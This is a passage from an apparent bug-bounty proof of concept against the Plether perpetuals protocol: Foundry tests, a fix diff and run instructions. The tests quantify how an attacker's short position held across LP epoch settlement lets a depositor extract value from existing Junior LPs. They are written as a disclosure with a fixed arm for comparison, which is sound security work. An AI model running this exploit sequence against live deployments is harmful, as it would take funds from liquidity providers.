        emit log_named_uint("    R", o.R);
        emit log_named_int("    A mark gain right after T close", o.aMarkGainAfterTClose);
        emit log_named_int("    A REALIZED cash gain (redeem - deposit)", o.aCashGain);
        emit log_named_int("    T balance change", o.tChange);
        emit log_named_int("    L balance change", o.lChange);
        emit log_named_int("    existing Junior change at A redeem", o.existingChangeAtRedeem);
        emit log_named_int("    existing Junior change end", o.existingChangeEnd);
    }

}

contract ReserveScenarioTest is ReserveScenarioBase {

    Cfg internal base;

    function setUp() public override {
        super.setUp();
        base = Cfg({
            withT: true,
            sizeL: 3_500_000e18,
            sizeT: 3_500_000e18,
            depositA: 3_000_000e6,
            moveBps: 0,
            closeLAfter: false,
            holdAfterSettle: 10 minutes
        });
    }

    // ---------------- realized differential (deposit -> T close -> redeem), vuln vs control
    function test_P1_realizedDifferential() public {
        uint256 snap = vm.snapshotState();
        Out memory v = _cycle(base);
        _logOut("VULN (T open across settlement), realized via redemption", v);
        vm.revertToState(snap);
        Cfg memory c = base;
        c.withT = false;
        Out memory k = _cycle(c);
        _logOut("CONTROL (no T)", k);
        emit log_named_int("A realized gain delta (VULN-CTRL)", v.aCashGain - k.aCashGain);
        emit log_named_int("existing Junior delta at redeem (VULN-CTRL)", v.existingChangeAtRedeem - k.existingChangeAtRedeem);
        emit log_named_int("ATTACKER NET (A realized + T change)", v.aCashGain + v.tChange);
    }

    // ---------------- NAV path, order (i) T closes first, then L
    function test_P2_navPath_TfirstThenL() public {
        _mark(1e8);
        _nav("[0] start");
        _open(L, CfdTypes.Side.LONG, 3_500_000e18, 200_000e6, 1e8);
        _nav("[1] after L open (skew +3.5M)");
        _open(T, CfdTypes.Side.SHORT, 3_500_000e18, 200_000e6, 1e8);
        _nav("[2] after T open (skew 0)");
        vm.warp(block.timestamp + 70 minutes);
        _mark(1e8);
        _close(T, CfdTypes.Side.SHORT, 3_500_000e18, 1e8);
        _nav("[3] after T close (skew +3.5M)");
        vm.warp(block.timestamp + 1 minutes);
        _mark(1e8);
        _close(L, CfdTypes.Side.LONG, 3_500_000e18, 1e8);
        _nav("[4] after L close (flat)");
    }

    // ---------------- NAV path, order (ii) L closes first, then T
    function test_P3_navPath_LfirstThenT() public {
        _mark(1e8);
        _nav("[0] start");
        _open(L, CfdTypes.Side.LONG, 3_500_000e18, 200_000e6, 1e8);
        _nav("[1] after L open");
        _open(T, CfdTypes.Side.SHORT, 3_500_000e18, 200_000e6, 1e8);
        _nav("[2] after T open");
        vm.warp(block.timestamp + 70 minutes);
        _mark(1e8);
        _close(L, CfdTypes.Side.LONG, 3_500_000e18, 1e8);
        _nav("[3] after L close (skew -3.5M, T alone)");
        vm.warp(block.timestamp + 1 minutes);
        _mark(1e8);
        _close(T, CfdTypes.Side.SHORT, 3_500_000e18, 1e8);
        _nav("[4] after T close (flat)");
    }

    // ---------------- close consumes exactly R from the dedicated reserve into the pool
    function test_P4_closeConsumesReserveToPool() public {
        _mark(1e8);
        _open(L, CfdTypes.Side.LONG, 3_500_000e18, 200_000e6, 1e8);
        _open(T, CfdTypes.Side.SHORT, 3_500_000e18, 200_000e6, 1e8);
        uint256 R = clearinghouse.vpiRebateReserveAssets(T);
        vm.warp(block.timestamp + 10 minutes);
        _mark(1e8);
        uint256 p0 = pool.totalAssets();
        vm.expectCall(
            address(clearinghouse), abi.encodeCall(MarginClearinghouse.consumeVpiRebateReserve, (T, address(pool), R))
        );
        _close(T, CfdTypes.Side.SHORT, 3_500_000e18, 1e8);
        emit log_named_uint("R", R);
        emit log_named_int("pool delta on T close", int256(pool.totalAssets()) - int256(p0));
        emit log_named_uint("reserve(T) after", clearinghouse.vpiRebateReserveAssets(T));
    }

    // ---------------- partial close releases/consumes pro rata
    function test_P5_partialClose() public {
        _mark(1e8);
        _open(L, CfdTypes.Side.LONG, 3_500_000e18, 200_000e6, 1e8);
        _open(T, CfdTypes.Side.SHORT, 3_500_000e18, 200_000e6, 1e8);
        uint256 R = clearinghouse.vpiRebateReserveAssets(T);
        vm.warp(block.timestamp + 10 minutes);
        _mark(1e8);
        uint256 p0 = pool.totalAssets();
        _close(T, CfdTypes.Side.SHORT, 1_750_000e18, 1e8);
        emit log_named_uint("R", R);
        emit log_named_int("pool delta on half close", int256(pool.totalAssets()) - int256(p0));
        emit log_named_uint("reserve(T) after half close", clearinghouse.vpiRebateReserveAssets(T));
        emit log_named_int("vpiAccrued(T) after half close", _vpiAccrued(T));
        uint256 p1 = pool.totalAssets();
        _close(T, CfdTypes.Side.SHORT, 1_750_000e18, 1e8);
        emit log_named_int("pool delta on second half close", int256(pool.totalAssets()) - int256(p1));
        emit log_named_uint("reserve(T) after full", clearinghouse.vpiRebateReserveAssets(T));
    }

    // ---------------- liquidation (solvent and bad-debt) consumes R into the pool
    function _liqCase(
        uint256 priceAtLiq,
        string memory tag
    ) internal {
        _mark(1e8);
        _open(L, CfdTypes.Side.LONG, 3_500_000e18, 200_000e6, 1e8);
        _open(T, CfdTypes.Side.SHORT, 3_500_000e18, 20_000e6, 1e8);
        uint256 R = clearinghouse.vpiRebateReserveAssets(T);
        vm.warp(block.timestamp + 10 minutes);
        _mark(priceAtLiq);
        uint256 p0 = pool.totalAssets();
        int256 t0 = int256(clearinghouse.balanceAssets(T));
        vm.expectCall(
            address(clearinghouse), abi.encodeCall(MarginClearinghouse.consumeVpiRebateReserve, (T, address(pool), R))
        );
        uint256 depth = pool.totalAssets();
        vm.prank(address(router));
        engine.liquidatePosition(T, priceAtLiq, depth, uint64(block.timestamp), K);
        emit log_string(tag);
        emit log_named_uint("  R", R);
        emit log_named_int("  pool delta on liquidation", int256(pool.totalAssets()) - int256(p0));
        emit log_named_int("  T balance delta on liquidation", int256(clearinghouse.balanceAssets(T)) - t0);
        emit log_named_uint("  reserve(T) after", clearinghouse.vpiRebateReserveAssets(T));
        emit log_named_uint("  T settlement balance after", clearinghouse.balanceAssets(T));
        emit log_named_string("  degradedMode", engine.degradedMode() ? "true" : "false");
    }

    function test_P6_liquidationSolvent() public {
        _liqCase(0.995e8, "LIQ solvent-ish (SHORT, mark -0.5%, margin 20k)");
    }

    function test_P7_liquidationBadDebt() public {
        _liqCase(0.97e8, "LIQ bad debt (SHORT, mark -3%, margin 20k)");
    }

    // ---------------- price exposure over the hold
    function _priceCase(
        int256 bps
    ) internal {
        Cfg memory c = base;
        c.moveBps = bps;
        uint256 snap = vm.snapshotState();
        Out memory v = _cycle(c);
        vm.revertToState(snap);
        c.withT = false;
        Out memory k = _cycle(c);
        vm.revertToState(snap);
        emit log_named_int("move bps", bps);
        emit log_named_int("  VULN attacker net (A realized + T change)", v.aCashGain + v.tChange);
        emit log_named_int("  VULN A realized", v.aCashGain);
        emit log_named_int("  VULN T change", v.tChange);
        emit log_named_int("  CTRL A realized (same price path, no T)", k.aCashGain);
        emit log_named_int("  attacker net minus CTRL A (incremental)", v.aCashGain + v.tChange - k.aCashGain);
    }

    function test_P8_priceExposure() public {
        _priceCase(-100);
        _priceCase(-50);
        _priceCase(-25);
        _priceCase(0);
        _priceCase(25);
        _priceCase(50);
        _priceCase(100);
    }

    // ---------------- self-created skew (attacker owns L, T and A; L closes after A redeems)
    function test_P9_selfCreatedSkew() public {
        Cfg memory c = base;
        c.closeLAfter = true;
        uint256 snap = vm.snapshotState();
        Out memory v = _cycle(c);
        _logOut("SELF-SKEW VULN (attacker = L + T + A)", v);
        emit log_named_int("  ATTACKER NET (A + T + L)", v.aCashGain + v.tChange + v.lChange);
        vm.revertToState(snap);
        c.withT = false;
        Out memory k = _cycle(c);
        _logOut("SELF-SKEW without T (attacker = L + A)", k);
        emit log_named_int("  NET (A + L)", k.aCashGain + k.lChange);
    }

    // ---------------- third-party / no-attacker cohort transfer (smaller ordinary sizes)
    function test_P10_noAttackerCohort() public {
        Cfg memory c = Cfg({
            withT: true,
            sizeL: 2_000_000e18,
            sizeT: 1_000_000e18,
            depositA: 500_000e6,
            moveBps: 0,
            closeLAfter: false,
            holdAfterSettle: 10 minutes
        });
        uint256 snap = vm.snapshotState();
        Out memory v = _cycle(c);
        _logOut("ORDINARY depositor D=500k, third-party T 1M short vs L 2M long", v);
        vm.revertToState(snap);
        c.withT = false;
        Out memory k = _cycle(c);
        _logOut("CONTROL (no T)", k);
        emit log_named_int("D realized gain delta (VULN-CTRL)", v.aCashGain - k.aCashGain);
        emit log_named_int("existing Junior delta at redeem (VULN-CTRL)", v.existingChangeAtRedeem - k.existingChangeAtRedeem);
    }

    // ---------------- third-party variant at the configuration-1 sizes (the depositor A trades nothing)
    function test_P11_thirdPartyDeposit() public {
        uint256 snap = vm.snapshotState();
        Out memory v = _cycle(base);
        vm.revertToState(snap);
        Cfg memory c = base;
        c.withT = false;
        Out memory k = _cycle(c);
        emit log_named_int("third-party: A realized (VULN)", v.aCashGain);
        emit log_named_int("third-party: A realized (CTRL)", k.aCashGain);
        emit log_named_int("third-party: attacker net incremental (A only)", v.aCashGain - k.aCashGain);
    }

    // ---------------- scale - A = 9M and a larger pool (J 3M, S 6M fixed by base; vary A)
    function test_P12_bigA() public {
        Cfg memory c = base;
        c.depositA = 9_000_000e6;
        uint256 snap = vm.snapshotState();
        Out memory v = _cycle(c);
        vm.revertToState(snap);
        c.withT = false;
        Out memory k = _cycle(c);
        emit log_named_uint("R", v.R);
        emit log_named_int("A=9M realized VULN", v.aCashGain);
        emit log_named_int("A=9M realized CTRL", k.aCashGain);
        emit log_named_int("A=9M ATTACKER NET (A + T)", v.aCashGain + v.tChange);
        emit log_named_int("A=9M existing Junior delta (VULN-CTRL)", v.existingChangeAtRedeem - k.existingChangeAtRedeem);
    }


    // ---------------- self-created skew at A = 9J (27M) - upper bound of the self-skew variant
    function test_P14_selfSkewHugeA() public {
        Cfg memory c = base;
        c.closeLAfter = true;
        c.depositA = 27_000_000e6;
        Out memory v = _cycle(c);
        _logOut("SELF-SKEW VULN A=27M", v);
        emit log_named_int("  ATTACKER NET (A + T + L)", v.aCashGain + v.tChange + v.lChange);
    }

    // ---------------- mirror with no reserve (separate property, not claimed): no T; A enters flat, attacker L opens, A exits, L closes
    function test_P13_mirrorNoReserve() public {
        uint256 existingShares = juniorVault.balanceOf(address(this));
        uint256 exStart = juniorVault.convertToAssets(existingShares);
        int256 lStart = int256(clearinghouse.balanceAssets(L));
        _mark(1e8);
        settlementToken.mint(A, 3_000_000e6);
        vm.startPrank(A);
        settlementToken.approve(address(juniorVault), 3_000_000e6);
        uint256 reqId = juniorVault.requestDeposit(3_000_000e6, A, A);
        vm.stopPrank();
        uint256 activation = juniorVault.depositEpochStart(reqId);
        vm.warp(activation);
        _mark(1e8);
        _settleLpEpochForTest();
        vm.prank(A);
        uint256 sharesA = juniorVault.claimDeposit(reqId, 3_000_000e6, A, A);
        vm.warp(block.timestamp + 10 minutes);
        _mark(1e8);
        _open(L, CfdTypes.Side.LONG, 3_500_000e18, 200_000e6, 1e8);
        vm.warp(activation + juniorVault.DEPOSIT_COOLDOWN() + 1);
        _mark(1e8);
        vm.prank(A);
        uint256 rid = juniorVault.requestRedeem(sharesA, A, A);
        vm.warp(pool.lpEpochStart(rid));
        _mark(1e8);
        _settleLpEpochForTest();
        uint256 b = settlementToken.balanceOf(A);
        vm.prank(A);
        juniorVault.claimRedeem(rid, sharesA, A, A);
        int256 aGain = int256(settlementToken.balanceOf(A) - b) - int256(3_000_000e6);
        vm.warp(block.timestamp + 60);
        _mark(1e8);
        _close(L, CfdTypes.Side.LONG, 3_500_000e18, 1e8);
        int256 lChange = int256(clearinghouse.balanceAssets(L)) - lStart;
        emit log_named_int("MIRROR A realized", aGain);
        emit log_named_int("MIRROR L change (VPI round trip + fees + carry)", lChange);
        emit log_named_int("MIRROR attacker net (A + L)", aGain + lChange);
        emit log_named_int("MIRROR existing Junior change end", int256(juniorVault.convertToAssets(existingShares)) - int256(exStart));
    }

}

/// @notice Redemption side: an existing Junior LP X redeems in an epoch funded while T's reserve is open.
contract ReserveRedeemTest is ReserveScenarioBase {

    function setUp() public override {
        super.setUp();
        _mark(1e8);
        _fundJunior(X, 1_000_000e6);
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN() + 1);
    }

    function _redeemCase(
        bool withT
    ) internal returns (int256 xGain, int256 exChange, uint256 R) {
        uint256 existingShares = juniorVault.balanceOf(address(this));
        uint256 xShares = juniorVault.balanceOf(X);
        _mark(1e8);
        _open(L, CfdTypes.Side.LONG, 3_500_000e18, 200_000e6, 1e8);
        uint256 xValStart = juniorVault.convertToAssets(xShares);
        uint256 exStart = juniorVault.convertToAssets(existingShares);
        if (withT) {
            _open(T, CfdTypes.Side.SHORT, 3_500_000e18, 200_000e6, 1e8);
            R = clearinghouse.vpiRebateReserveAssets(T);
        }
        vm.prank(X);
        uint256 rid = juniorVault.requestRedeem(xShares, X, X);
        vm.warp(pool.lpEpochStart(rid));
        _mark(1e8);
        _settleLpEpochForTest();
        uint256 cr = juniorVault.claimableRedeemRequest(rid, X);
        assertEq(cr, xShares, "X redeem funded");
        uint256 b = settlementToken.balanceOf(X);
        vm.prank(X);
        juniorVault.claimRedeem(rid, cr, X, X);
        xGain = int256(settlementToken.balanceOf(X) - b) - int256(xValStart);
        vm.warp(block.timestamp + 10 minutes);
        _mark(1e8);
        if (withT) {
            _close(T, CfdTypes.Side.SHORT, 3_500_000e18, 1e8);
        }
        exChange = int256(juniorVault.convertToAssets(existingShares)) - int256(exStart);
    }

    function test_R1_redemptionSide() public {
        uint256 snap = vm.snapshotState();
        (int256 xv, int256 ev, uint256 R) = _redeemCase(true);
        vm.revertToState(snap);
        (int256 xc, int256 ec,) = _redeemCase(false);
        emit log_named_uint("R", R);
        emit log_named_uint("X shares value basis: X deposit", 1_000_000e6);
        emit log_named_int("X cash vs value at start, VULN", xv);
        emit log_named_int("X cash vs value at start, CTRL", xc);
        emit log_named_int("X delta (VULN-CTRL)", xv - xc);
        emit log_named_int("remaining existing Junior change, VULN", ev);
        emit log_named_int("remaining existing Junior change, CTRL", ec);
        emit log_named_int("remaining existing Junior delta (VULN-CTRL)", ev - ec);
    }

}

/// @notice Production-shaped path: router commit + keeper execute for T's open/close and router.settleLpEpoch.
contract ReserveRouterTest is ReserveScenarioBase {

    function _request(
        CfdTypes.Side side,
        bool close,
        uint256 size,
        uint256 margin
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = keccak256(abi.encode("lp-nav-vpi-router", router.nextCommitId()));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.isClose = close;
        request.targetPrice = (side == CfdTypes.Side.LONG) == close ? 2e8 : 1;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 60),
            executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _commitExec(
        address account,
        CfdTypes.Side side,
        bool close,
        uint256 size,
        uint256 margin,
        uint256 price
    ) internal {
        OrderV3Types.OrderRequest memory request = _request(side, close, size, margin);
        vm.prank(account);
        uint64 id = router.commitOrder(request);
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(K);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "router order executed");
    }

    function _priceData(
        uint256 price
    ) internal returns (bytes[] memory data) {
        uint256 publishTime = vm.getBlockTimestamp();
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(price)), 0, -8, publishTime);
        baseMockPyth.setAllUniquePrices(_basePythFeedIds(), int64(uint64(price)), 0, -8, publishTime, publishTime - 1);
        data = new bytes[](1);
        data[0] = "";
    }

    struct RO {
        int256 aGain;
        int256 tChange;
        int256 exChange;
        uint256 R;
        uint256 hold;
    }

    uint256 internal sExShares;
    uint256 internal sExStart;
    int256 internal sTStart;
    uint256 internal sActivation;
    uint256 internal sSharesA;
    uint256 internal sTOpen;

    function _routerCycle(
        bool withT
    ) internal returns (RO memory o) {
        sExShares = juniorVault.balanceOf(address(this));
        _commitExec(L, CfdTypes.Side.LONG, false, 3_500_000e18, 200_000e6, 1e8);
        sExStart = juniorVault.convertToAssets(sExShares);
        sTStart = int256(clearinghouse.balanceAssets(T));
        settlementToken.mint(A, 3_000_000e6);
        vm.startPrank(A);
        settlementToken.approve(address(juniorVault), 3_000_000e6);
        uint256 reqId = juniorVault.requestDeposit(3_000_000e6, A, A);
        vm.stopPrank();
        sActivation = juniorVault.depositEpochStart(reqId);
        // T opens as late as possible: commit 120 s before the boundary (after A's request cutoff has passed).
        vm.warp(sActivation - 120);
        if (withT) {
            _commitExec(T, CfdTypes.Side.SHORT, false, 3_500_000e18, 200_000e6, 1e8);
            o.R = clearinghouse.vpiRebateReserveAssets(T);
            sTOpen = block.timestamp;
        }
        vm.warp(sActivation);
        router.settleLpEpoch(_priceData(1e8));
        assertEq(juniorVault.claimableDepositRequest(reqId, A), 3_000_000e6, "deposit settled via router");
        vm.prank(A);
        sSharesA = juniorVault.claimDeposit(reqId, 3_000_000e6, A, A);
        if (withT) {
            vm.warp(block.timestamp + 1);
            _commitExec(T, CfdTypes.Side.SHORT, true, 3_500_000e18, 0, 1e8);
            o.hold = block.timestamp - sTOpen;
        }
        o.tChange = int256(clearinghouse.balanceAssets(T)) - sTStart;
        o.aGain = _routerRedeem() - int256(3_000_000e6);
        o.exChange = int256(juniorVault.convertToAssets(sExShares)) - int256(sExStart);
    }

    function _routerRedeem() internal returns (int256 paid) {
        vm.warp(sActivation + juniorVault.DEPOSIT_COOLDOWN() + 1);
        router.updateMarkPrice(_priceData(1e8));
        vm.prank(A);
        uint256 rid = juniorVault.requestRedeem(sSharesA, A, A);
        vm.warp(pool.lpEpochStart(rid));
        router.settleLpEpoch(_priceData(1e8));
        assertEq(juniorVault.claimableRedeemRequest(rid, A), sSharesA, "redeem funded");
        uint256 b = settlementToken.balanceOf(A);
        vm.prank(A);
        juniorVault.claimRedeem(rid, sSharesA, A, A);
        paid = int256(settlementToken.balanceOf(A) - b);
    }

    function test_X1_routerPath() public {
        uint256 snap = vm.snapshotState();
        RO memory v = _routerCycle(true);
        vm.revertToState(snap);
        RO memory c = _routerCycle(false);
        emit log_named_uint("R (router path)", v.R);
        emit log_named_uint("T hold seconds (open exec -> close exec)", v.hold);
        emit log_named_int("A realized VULN", v.aGain);
        emit log_named_int("A realized CTRL", c.aGain);
        emit log_named_int("T change (fees, bounties, carry)", v.tChange);
        emit log_named_int("ATTACKER NET (A + T)", v.aGain + v.tChange);
        emit log_named_int("ATTACKER NET incremental vs CTRL A", v.aGain + v.tChange - c.aGain);
        emit log_named_int("existing Junior delta (VULN-CTRL)", v.exChange - c.exChange);
    }

}
```

`fixarm.diff` (the fixed arm used for the differential):
```diff
diff --git a/packages/perps/src/CfdEngineProtocolLens.sol b/packages/perps/src/CfdEngineProtocolLens.sol
index 134bc599..1d933078 100644
--- a/packages/perps/src/CfdEngineProtocolLens.sol
+++ b/packages/perps/src/CfdEngineProtocolLens.sol
@@ -3,6 +3,7 @@ pragma solidity 0.8.35;
 
 import {CfdEngine} from "@plether/perps/CfdEngine.sol";
 import {CfdTypes} from "@plether/perps/CfdTypes.sol";
+import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
 import {HousePoolEngineViewTypes} from "@plether/perps/interfaces/HousePoolEngineViewTypes.sol";
 import {ICfdEngineProtocolLens} from "@plether/perps/interfaces/ICfdEngineProtocolLens.sol";
 import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
@@ -67,7 +68,8 @@ contract CfdEngineProtocolLens is ICfdEngineProtocolLens {
         snapshot.supplementalReservedAssets = SolvencyAccountingLib.settlementBufferTargetAssets(
             snapshot.maxLiabilityAssets, engineContract.settlementBufferBps()
         );
-        snapshot.terminalLpPriceDeltaAssets = terminalSnapshot.terminalLpPriceDeltaAssets;
+        snapshot.terminalLpPriceDeltaAssets = terminalSnapshot.terminalLpPriceDeltaAssets
+            + int256(MarginClearinghouse(address(engineContract.clearinghouse())).totalVpiRebateReserveAssets());
         snapshot.terminalNavBookVersion = terminalSnapshot.bookVersion;
         snapshot.traderClaimBalanceAssets = terminalSnapshot.totalTraderClaimsAssets;
         snapshot.hasOpenPositions = terminalSnapshot.hasOpenPositions;
diff --git a/packages/perps/src/MarginClearinghouse.sol b/packages/perps/src/MarginClearinghouse.sol
index 484a6d59..59fa021e 100644
--- a/packages/perps/src/MarginClearinghouse.sol
+++ b/packages/perps/src/MarginClearinghouse.sol
@@ -47,6 +47,8 @@ contract MarginClearinghouse is IMarginAccount, Ownable2Step, ReentrancyGuardTra
     mapping(address => uint256) internal reservedSettlementAssets;
     /// @dev Mandatory negative-lifetime-VPI floor contained inside `reservedSettlementAssets`; never counted twice.
     mapping(address => uint256) internal vpiRebateReserveBalances;
+    /// @notice Aggregate of all accounts' negative-VPI reserve backing (fix arm).
+    uint256 public totalVpiRebateReserveAssets;
     mapping(address => uint256) internal liquidationReserveBalances;
     mapping(uint64 => IMarginClearinghouse.OrderReservation) internal orderReservations;
     mapping(address => uint256) internal activeCommittedOrderReservationAssets;
@@ -849,6 +851,7 @@ contract MarginClearinghouse is IMarginAccount, Ownable2Step, ReentrancyGuardTra
         }
         _lockMargin(account, IMarginClearinghouse.MarginBucket.ReservedSettlement, amountAssets);
         vpiRebateReserveBalances[account] += amountAssets;
+        totalVpiRebateReserveAssets += amountAssets;
     }
 
     /// @notice Reclassifies newly locked PnL pledge into mandatory negative-VPI backing without moving cash.
@@ -862,6 +865,7 @@ contract MarginClearinghouse is IMarginAccount, Ownable2Step, ReentrancyGuardTra
         _consumeLockedMargin(account, IMarginClearinghouse.MarginBucket.Position, amountAssets);
         reservedSettlementAssets[account] += amountAssets;
         vpiRebateReserveBalances[account] += amountAssets;
+        totalVpiRebateReserveAssets += amountAssets;
         emit MarginLocked(account, IMarginClearinghouse.MarginBucket.ReservedSettlement, amountAssets);
     }
 
@@ -877,6 +881,7 @@ contract MarginClearinghouse is IMarginAccount, Ownable2Step, ReentrancyGuardTra
             revert MarginClearinghouse__ActionReserveMismatch();
         }
         vpiRebateReserveBalances[account] -= amountAssets;
+        totalVpiRebateReserveAssets -= amountAssets;
         _unlockMargin(account, IMarginClearinghouse.MarginBucket.ReservedSettlement, amountAssets);
     }
 
@@ -899,6 +904,7 @@ contract MarginClearinghouse is IMarginAccount, Ownable2Step, ReentrancyGuardTra
             revert MarginClearinghouse__ActionReserveMismatch();
         }
         vpiRebateReserveBalances[account] -= amountAssets;
+        totalVpiRebateReserveAssets -= amountAssets;
         reservedSettlementAssets[account] -= amountAssets;
         settlementBalances[account] -= amountAssets;
         IERC20(settlementAsset).safeTransfer(recipient, amountAssets);
```

`RUN.md`:
```
# RUN - LP NAV omits the reserved VPI rebate clawback

## Place the files

```
packages/perps/test/perps/poc/lp_nav_vpi/LpNavVpiReserveMispricing.t.sol
packages/perps/test/perps/poc/lp_nav_vpi/LpNavVpiReserveScenarios.t.sol
```

## Vulnerable arm (unmodified source, from the repository root)

```
FOUNDRY_VIA_IR=false forge test --root packages/perps --match-path test/perps/poc/lp_nav_vpi/LpNavVpiReserveMispricing.t.sol -vv
FOUNDRY_VIA_IR=false forge test --root packages/perps --match-path test/perps/poc/lp_nav_vpi/LpNavVpiReserveScenarios.t.sol -vv
```

Expected: 5/5 PASS and 16/16 PASS. The harm assertions are in `test_differential_cfg1` (first file). The second
file logs the realised differential (`test_P1_realizedDifferential`), the router path (`test_X1_routerPath`),
the redemption side (`test_R1_redemptionSide`), reserve consumption on every exit path (`test_P4`..`test_P7`),
the no-attacker cohort (`test_P10`), the third-party variant (`test_P11`), scale (`test_P12`), price exposure
(`test_P8`) and a mirror sequence with no reserve that is not part of the claim (`test_P13`).

## Fixed arm (a separate copy of the repository)

```
git apply fixarm.diff        # from the repository root; touches CfdEngineProtocolLens.sol and MarginClearinghouse.sol
FOUNDRY_VIA_IR=false forge test --root packages/perps --match-path test/perps/poc/lp_nav_vpi/LpNavVpiReserveMispricing.t.sol -vv
FOUNDRY_VIA_IR=false forge test --root packages/perps --match-path test/perps/poc/lp_nav_vpi/LpNavVpiReserveScenarios.t.sol -vv
```

Expected: 4/5 (only `test_differential_cfg1` fails: its harm assertion no longer fires) and 16/16 PASS with the
differential quantities near zero. Use a separate output/cache directory (or `forge clean`) between the two trees.

## Environment

- Repository: https://github.com/immunefi-team/audit-comp-plether at commit
  `a82d4fefb02768e5b3bddcc97dee371eee24fea8` (submodules `lib/forge-std`, `lib/openzeppelin-contracts`,
  `lib/morpho-blue` checked out).
- Foundry: forge 1.7.1 (commit 4072e48705af9d93e3c0f6e29e93b5e9a40caed8), solc 0.8.35. The same numbers were also
  obtained with forge 1.5.1.
- Build lane: `packages/perps/foundry.toml` sets `via_ir = true` in the default profile. via-IR is disabled here
  only because building `src` plus every test under via-IR ran out of memory on our machine. The contracts are not
  modified for the vulnerable arm. Compile ONE FILE at a time with `FOUNDRY_VIA_IR=false` and always pass
  `--match-path`.
- No RPC, no fork, no network: everything runs against the suite's local `BasePerpTest` deployment with mocked
  Pyth. Add `--offline` if solc 0.8.35 is already installed.
- `--match-path` is relative to `--root` (`packages/perps`).
```

